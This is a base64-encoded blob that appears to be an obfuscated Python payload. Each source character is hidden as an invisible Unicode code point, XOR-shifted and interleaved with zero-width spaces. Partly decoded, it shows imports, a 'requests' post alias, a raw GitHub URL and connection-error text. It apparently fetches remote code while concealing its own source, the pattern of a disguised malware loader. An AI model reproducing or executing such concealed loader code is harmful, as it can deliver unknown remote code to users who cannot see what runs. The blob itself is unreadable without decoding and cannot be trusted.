L4oCx4oCL4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oGo4oCL4oGk4oCL\n4oGn4oCL4oGk4oCL4oG54oCL4oGq4oCL4oGm4oCL4oGq4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL\n4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCn4oCL4oCr4oCL\n4oGY4oCL4oG/4oCL4oGy4oCL4oGn4oCL4oGu4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL\n4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL\n4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL\n4oGn4oCL4oCr4oCL4oGo4oCL4oGk4oCL4oGn4oCL4oGk4oCL4oG54oCL4oGq4oCL4oGm4oCL4oGq4oCL\n4oCp4oCL4oCi4oCL4oCB4oCL4oCB""4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGi4oCL\n4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG44oCL4oGy4oCL4oG44oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL\n4oG54oCL4oG/4oCL4oCr4oCL4oGk4oCL4oG44oCL4oCn4oCL4oCr4oCL4oG44oCL4oGy4oCL4oG44oCL\n4oCn4oCL4oCr4oCL4oG44oCL4oG+4oCL4oGp4oCL4oG74oCL4oG54oCL4oGk4oCL4oGo4oCL4oGu4oCL\n4oG44oCL4oG44oCL4oCn4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL\n4oGn4oCL4oGi4oCL4oGp4oCL4oCl4oCL4oG+4oCL4oG/4oCL4oGi4oCL4oGn4oCL4oCn4oCL4oCr4oCL\n4oG/4oCL4oGi4oCL4oGm4oCL4oGu4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG54oCL4oGu4oCL4oG64oCL4oG+4oCL\n4oGu4oCL4oG44oCL4oG/4oCL4oG44oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL\n4oG/4oCL4oCr4oCL4oG74oCL4oGk4oCL4oG44oCL4oG/4oCL4oCr4oCL4oGq4oCL4oG44oCL4oCr4oCL\n4oG74oCL4oG74oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGt4oCL\n4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL4oGk4oCL4oGm4oCL\n4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGo4oCL4oGj4oCL\n4oGk4oCL4oGi4oCL4oGo4oCL4oGu4oCL4oCr4oCL4oGq4oCL4oG44oCL4oCr4oCL4oGo4oCL4oGo4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGt4oCL4oG54oCL4oGk4oCL\n4oGm4oCL4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL4oGk4oCL4oGm4oCL4oCr4oCL4oGi4oCL\n4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL\n4oG54oCL4oGq4oCL4oGl4oCL4oGs4oCL4oGu4oCL4oCr4oCL4oGq4oCL4oG44oCL4oCr4oCL4oG54oCL\n4oG54oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGv4oCL4oGu4oCL4oGt4oCL4oCr4oCL4oGK4oCL\n4oCj4oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oG54oCL4oGu4oCL4oG/4oCL4oG+4oCL4oG54oCL4oGl4oCL\n4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL4oGk4oCL4oGm4oCL4oCl4oCL4oGo4oCL4oGj4oCL\n4oGk4oCL4oGi4oCL4oGo4oCL4oGu4oCL4oCj4oCL4oGQ4oCL4oCp4oCL4oGo""4oCL4oGy4oCL4oGq4oCL\n4oGl4oCL4oCp4oCL4oCn4oCL4oCr4oCL4oCp4oCL4oGp4oCL4oGn4oCL4oG+4oCL4oGu4oCL4oCp4oCL\n4oCn4oCL4oCr4oCL4oCp4oCL4oGs4oCL4oG54oCL4oGu4oCL4oGu4oCL4oGl4oCL4oCp4oCL4oCn4oCL\n4oCr4oCL4oCp4oCL4oGy4oCL4oGu4oCL4oGn4oCL4oGn4oCL4oGk4oCL4oG84oCL4oCp4oCL4oCn4oCL\n4oCr4oCL4oCp4oCL4oGm4oCL4oGq4oCL4oGs4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oGq4oCL4oCp4oCL\n4oGW4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGv4oCL4oGu4oCL4oGt4oCL4oCr4oCL\n4oGJ4oCL4oCj4oCL4oGI4oCL4oCn4oCL4oCr4oCL4oGP4oCL4oC24oCL4oC74oCL4oCl4oCL4oC74oCL\n4oC+4oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGO4oCL4oCr4oCL\n4oGi4oCL4oGl4oCL4oCr4oCL4oGI4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oG74oCL4oG54oCL4oGi4oCL4oGl4oCL4oG/4oCL4oCj4oCL4oGO4oCL4oCn4oCL4oCr4oCL4oGu4oCL\n4oGl4oCL4oGv4oCL4oC24oCL4oCs4oCL4oCs4oCL4oCn4oCL4oCr4oCL4oGt4oCL4oGn4oCL4oG+4oCL\n4oG44oCL4oGj4oCL4oC24oCL4oGf4oCL4oG54oCL4oG+4oCL4oGu4oCL4oCi4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oG/4oCL4oGi4oCL4oGm4oCL4oGu4oCL4oCl4oCL4oG44oCL4oGn4oCL\n4oGu4oCL4oGu4oCL4oG74oCL4oCj4oCL4oGP4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oG74oCL4oG54oCL4oGi4oCL\n4oGl4oCL4oG/4oCL4oCj4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGv4oCL4oGu4oCL\n4oGt4oCL4oCr4oCL4oGN4oCL4oCj4oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGM4oCL4oCr4oCL4oC24oCL\n4oCr4oCL4oGo4oCL4oGt4oCL4oGk4oCL4oGl4oCL4oG/4oCL4oG44oCL4oCl4oCL4oG54oCL4oGu4oCL\n4oGl4oCL4oGv4oCL4oGu4oCL4oG54oCL4oCj4oCL4oCp4oCL4oGN4oCL4oGD4oCL4oGI4oCL4oGA4oCL\n4oCp4oCL4o""Cn4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oGt4oCL4oGk4oCL4oGl4oCL4oG/4oCL4oC24oCL4oCs4oCL4oGp4oCL4oGn4oCL4oGk4oCL\n4oGo4oCL4oGg4oCL4oCs4oCL4oCn4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGo4oCL\n4oGk4oCL4oGn4oCL4oGk4oCL4oG54oCL4oG44oCL4oC24oCL4oGQ4oCL4oGK4oCL4oCj4oCL4oCi4oCL\n4oGW4oCL4oCn4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGq4oCL4oGn4oCL4oGi4oCL\n4oGs4oCL4oGl4oCL4oC24oCL4oCs4oCL4oGn4oCL4oGu4oCL4oGt4oCL4oG/4oCL4oCs4oCL4oCn4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oG44oCL4oG74oCL4oGq4oCL4oGo4oCL4oGu4oCL\n4oC24oCL4oGN4oCL4oGq4oCL4oGn4oCL4oG44oCL4oGu4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCi4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oG74oCL\n4oG54oCL4oGi4oCL4oGl4oCL4oG/4oCL4oCj4oCL4oGM4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGv4oCL4oGu4oCL4oGt4oCL4oCr4oCL4oGD4oCL4oCj4oCL4oCi4oCL4oCx4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oGC4oCL4oCr4oCL4oC24oCL4oCr4oCL4oGt4oCL4oCp4oCL4oCp4oCL4oCp4oCL4oGw4oCL4oGN4oCL\n4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGG4oCL4oGK4oCL4oGM4oCL4oGO4oCL4oGF4oCL4oGf4oCL\n4oGK4oCL4oG24oCL4oGf4oCL4oGu4oCL4oGn4oCL4oGu4oCL4oGs4oCL4oG54oCL4oGq4oCL4oGm4oCL\n4oCx4oCL4oCr4oCL4oGw4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGc4oCL4oGD4oCL\n4oGC4oCL4oGf4oCL4oGO4oCL4oG24oCL4oCr4oCL4oGL4oCL4oGm4oCL4oGm4oCL4oGj4oCL4oGj4oCL\n4oGl4oCL4oCB4oCL4oGw4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGG4oCL4oGK4oCL\n4oGM4oCL4oGO4oCL4oGF4oCL4oGf4oCL4oGK4oCL4oG24oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGB4oCL\n4oGk4oCL4oGi4oCL4oGl4oCL4oCr4oCL4oGw4oCL4o""GN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL\n4oGc4oCL4oGD4oCL4oGC4oCL4oGf4oCL4oGO4oCL4oG24oCL4oGL4oCL4oGm4oCL4oGm4oCL4oGm4oCL\n4oGj4oCL4oGl4oCL4oGw4oCL4oGY4oCL4oG/4oCL4oGy4oCL4oGn4oCL4oGu4oCL4oCl4oCL4oGZ4oCL\n4oGO4oCL4oGY4oCL4oGO4oCL4oGf4oCL4oGU4oCL4oGK4oCL4oGH4oCL4oGH4oCL4oG24oCL4oCp4oCL\n4oCp4oCL4oCp4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGB4oCL4oCr4oCL4oGi4oCL\n4oGl4oCL4oCr4oCL4oGC4oCL4oCl4oCL4oG44oCL4oG74oCL4oGn4oCL4oGi4oCL4oG/4oCL4oCj4oCL\n4oCp4oCL4oGX4oCL4oGl4oCL4oCp4oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oG74oCL4oG54oCL4oGi4oCL4oGl4oCL4oG/4oCL4oCj4oCL4oCp4oCL4oCr4oCL4oCp4oCL\n4oCr4oCL4oCh4oCL4oCr4oCL4oC/4oCL4oC74oCL4oCr4oCL4oCg4oCL4oCr4oCL4oGB4oCL4oCi4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGv4oCL4oGu4oCL4oGt4oCL4oCr4oCL4oGA4oCL4oCj4oCL\n4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oGH4oCL4oCr4oCL4oC24oCL4oCr4oCL4oGt4oCL4oCp4oCL4oCp4oCL\n4oCp4oCL4oGw4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGZ4oCL4oGO4oCL4oGP4oCL\n4oG24oCL4oGN4oCL4oGC4oCL4oGH4oCL4oGO4oCL4oCr4oCL4oGD4oCL4oGK4oCL4oGY4oCL4oCr4oCL\n4oGO4oCL4oGT4oCL4oGb4oCL4oGC4oCL4oGZ4oCL4oGO4oCL4oGP4oCL4oCl4oCL4oGw4oCL4oGY4oCL\n4oG/4oCL4oGy4oCL4oGn4oCL4oGu4oCL4oCl4oCL4oGZ4oCL4oGO4oCL4oGY4oCL4oGO4oCL4oGf4oCL\n4oGU4oCL4oGK4oCL4oGH4oCL4oGH4oCL4oG24oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oGw4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGS4oCL4oGO4oCL\n4oGH4oCL4oGH4oCL4oGE4oCL4oGc4oCL4oG24oCL4oGP4oCL4oGG4oCL4oCr4oCL4oGw4oCL4oGN4oCL\n4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGG4oCL4oGK4oCL4oGM4oCL4oGO4oCL4oGF4oCL4oGf4oCL\n4oGK4oCL4oG24oCL4oCr4oCL4oGL4oCL4oGm4oCL4oGm4oCL4oGj4oCL4oGj4oCL4oGl4oCL4oCr4oCL\n4oGw4oCL4oGN4oCL4oGk4oCL4oG54oCL4oGu4oCL4oCl4oCL4oGS4oCL4oGO4oCL4oGH4oCL4o""GH4oCL\n4oGE4oCL4oGc4oCL4oG24oCL4oG/4oCL4oGk4oCL4oCr4oCL4oGJ4oCL4oG+4oCL4oGy4oCL4oCr4oCL\n4oGk4oCL4oG54oCL4oCr4oCL4oGZ4oCL4oGO4oCL4oGF4oCL4oGO4oCL4oGc4oCL4oCl4oCL4oGw4oCL\n4oGY4oCL4oG/4oCL4oGy4oCL4oGn4oCL4oGu4oCL4oCl4oCL4oGZ4oCL4oGO4oCL4oGY4oCL4oGO4oCL\n4oGf4oCL4oGU4oCL4oGK4oCL4oGH4oCL4oGH4oCL4oG24oCL4oCp4oCL4oCp4oCL4oCp4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oGG4oCL4oCj4oCL4oGH4oCL4oCn4oCL4oCr4oCL4oGP4oCL4oC24oCL4oC74oCL4oCl4oCL4oC74oCL\n4oC+4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGv4oCL4oGu4oCL4oGt4oCL4oCr4oCL\n4oGG4oCL4oCj4oCL4oGF4oCL4oCn4oCL4oCr4oCL4oGP4oCL4oC24oCL4oC74oCL4oCl4oCL4oC74oCL\n4oC64oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oGt4oCL4oGk4oCL4oG54oCL4oCr4oCL4oGE4oCL4oCr4oCL\n4oGi4oCL4oGl4oCL4oCr4oCL4oGF4oCL4oCl4oCL4oG44oCL4oG74oCL4oGn4oCL4oGi4oCL4oG/4oCL\n4oCj4oCL4oCp4oCL4oGX4oCL4oGl4oCL4oCp4oCL4oCi4oCL4oCx4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oGJ4oCL4oCj4oCL4oGE4oCL4oCn4oCL4oCr4oCL4oGP4oCL4oCi4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oGN4oCL4oCj4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oGD4oCL4oCj4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oG/4oCL4oGk4oCL4oG/4oCL4oGq4oCL4oGn4oCL4oCr4oCL4oC24oCL4oCr4oCL4oC74oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGj4oCL4oGi4oCL4oG/4oCL4oG44oCL\n4oCr4oCL4oC24oCL4oCr4oCL4oC74oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGp4oCL4oGq4oCL4oGv4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oCr4oCL\n4oC24oCL4oCr4oCL4oC74oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oGp4oCL4oGq4oCL4oGv4oCL""4oGu4oCL4oGm4oCL4oGq4oCL4oGi4oCL4oGn4oCL4oCr4oCL4oC24oCL\n4oCr4oCL4oC74oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGs4oCL\n4oGk4oCL4oGk4oCL4oGv4oCL4oGi4oCL4oGs4oCL4oCr4oCL4oC24oCL4oCr4oCL4oC74oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGp4oCL4oCr4oCL4oC24oCL4oCr4oCL\n4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL4oGk4oCL4oGm4oCL4oCl4oCL4oG54oCL4oGq4oCL4oGl4oCL\n4oGv4oCL4oGi4oCL4oGl4oCL4oG/4oCL4oCj4oCL4oC+4oCL4oCn4oCL4oC54oCL4oC74oCL4oCz4oCL\n4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGp4oCL4oGk4oCL\n4oCr4oCL4oC24oCL4oCr4oCL4oGt4oCL4oCs4oCL4oGX4oCL4oGz4oCL4oC64oCL4oGp4oCL4oGQ4oCL\n4oC44oCL4oCz4oCL4oCw4oCL4oC+4oCL4oCw4oCL4oGw4oCL4oGp4oCL4oG24oCL4oGm4oCL4oCs4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG74oCL4oG54oCL4oGi4oCL\n4oGl4oCL4oG/4oCL4oCj4oCL4oCp4oCL4oGX4oCL4oGz4oCL4oC64oCL4oGp4oCL4oGQ4oCL4oC64oCL\n4oCw4oCL4oC44oCL4oCy4oCL4oGm4oCL1IrigIvigKnigIvigKvigIvigKHigIvigKvigIvigL3igIvi\ngLvigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigZ/igIvi\ngaTigIvigaDigIviga7igIvigaXigIvigLbigIvigaLigIvigaXigIvigbvigIvigb7igIvigb/igIvi\ngKPigIvigKnigIvigY7igIvigaXigIvigb/igIviga7igIvigbnigIvigKvigIvigZLigIvigaTigIvi\ngb7igIvigbnigIvigKvigIvigZ/igIviga7igIvigafigIviga7igIvigazigIvigbnigIvigarigIvi\ngabigIvigKvigIvigYnigIvigaTigIvigb/igIvigZTigIvigZ/igIvigaTigIvigaDigIviga7igIvi\ngaXigIvigLHigIvigKvigIvigKnigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigbvigIvigbnigIvigaLigIvigaXigIvigb/igIvigKPigIvigKnigIvigZfigIvi\ngbPigIvigLrigIviganigIvigZDigIvigLrigIvigLDigIvigLjigIvigLLigIvigabigIvUiuKAi+KA\nqeKAi+KAq+KAi+KAoeKAi+KAq+KAi+KAveKAi+KAu+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBguKAi+KBj+KAi+KAtuKAi+KBouKAi+KBpeKAi+KBu+KAi+KB\nvuKAi+KBv+KAi+KAo+KAi+KArOKAi+KBjuKAi+KBpeKAi+KBv+KAi+KBruKAi+KBueKAi+KAq+KAi+KB\nkuKAi+KBpOKAi+KBvuKAi+KBueKAi+KAq+KAi+KBn+KAi+KBruKAi+KBp+KAi+KBruKAi+KBrOKAi+KB\nueKAi+KBquKAi+KBpuKAi+KAq+KAi+KBnuKAi+KBmOKAi+KBjuKAi+KB""meKAi+KBlOKAi+KBguKAi+KB\nj+KAi+KAseKAi+KAq+KAi+KArOKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KBvuKAi+KBueKAi+KBp+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KAqeKAi+KBo+KAi+KB\nv+KAi+KBv+KAi+KBu+KAi+KBuOKAi+KAseKAi+KApOKAi+KApOKAi+KBueKAi+KBquKAi+KBvOKAi+KA\npeKAi+KBrOKAi+KBouKAi+KBv+KAi+KBo+KAi+KBvuKAi+KBqeKAi+KBvuKAi+KBuOKAi+KBruKAi+KB\nueKAi+KBqOKAi+KBpOKAi+KBpeKAi+KBv+KAi+KBruKAi+KBpeKAi+KBv+KAi+KApeKAi+KBqOKAi+KB\npOKAi+KBpuKAi+KApOKAi+KBreKAi+KBo+KAi+KBqOKAi+KBoOKAi+KAu+KAi+KAs+KAi+KAvOKAi+KA\npOKAi+KBjeKAi+KBo+KAi+KBqOKAi+KBoOKAi+KBoOKAi+KApOKAi+KBueKAi+KBruKAi+KBreKAi+KB\nuOKAi+KApOKAi+KBo+KAi+KBruKAi+KBquKAi+KBr+KAi+KBuOKAi+KApOKAi+KBpuKAi+KBquKAi+KB\nouKAi+KBpeKAi+KApOKAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KBuOKAi+KBlOKAi+KBp+KAi+KB\nouKAi+KBuOKAi+KBv+KAi+KApeKAi+KBv+KAi+KBs+KAi+KBv+KAi+KAqeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KBv+KAi+KBueKAi+KBsuKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBuOKAi+KB\nu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBruKAi+KB\nuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KAi+KBuOKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KA\no+KAi+KBvuKAi+KBueKAi+KBp+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBuOKAi+KBu+KAi+KB\npOKAi+KBpeKAi+KBuOKAi+KBruKAi+KApeKAi+KBueKAi+KBquKAi+KBouKAi+KBuOKAi+KBruKAi+KB\nlOKAi+KBreKAi+KBpOKAi+KBueKAi+KBlOKAi+KBuOKAi+KBv+KAi+KBquKAi+KBv+KAi+KBvuKAi+KB\nuOKAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA\nq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBp+KAi+KBouKAi+KBpeKAi+KBruKAi+KBuOKAi+KAq+KAi+KA\ntuKAi+KAq+KAi+KBueKAi+KBruKAi+KBuOKAi+KBu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KA\npeKAi+KBv+KAi+KBruKAi+KBs+KAi+KBv+KAi+KApeKAi+KBuOKAi+KBu+KAi+KBp+KAi+KBouKAi+KB\nv+KAi+KBp+KAi+KBouKAi+KBpeKAi+KBruKAi+KBuOKAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKAi+KA\ngeKAi+""KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBruKAi+KBs+KAi+KBqOKAi+KBruKAi+KBu+KAi+KB\nv+KAi+KAq+KAi+KBueKAi+KBruKAi+KBuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KAi+KBuOKAi+KA\npeKAi+KBruKAi+KBs+KAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KB\nuOKAi+KApeKAi+KBmeKAi+KBruKAi+KBuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KAi+KBjuKAi+KB\ns+KAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KAseKAi+KAgeKAi+KA\ngeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KB\nu+KAi+KBueKAi+KBouKAi+KBpeKAi+KBv+KAi+KAo+KAi+KAqeKAi92H4oCL4oCr4oCL4oGF4oCL4oGE\n4oCL4oCr4oCL4oGC4oCL4oGF4oCL4oGf4oCL4oGO4oCL4oGZ4oCL4oGF4oCL4oGO4oCL4oGf4oCL4oCr\n4oCL4oGI4oCL4oGE4oCL4oGF4oCL4oGF4oCL4oGO4oCL4oGI4oCL4oGf4oCL4oGC4oCL4oGE4oCL4oGF\n4oCL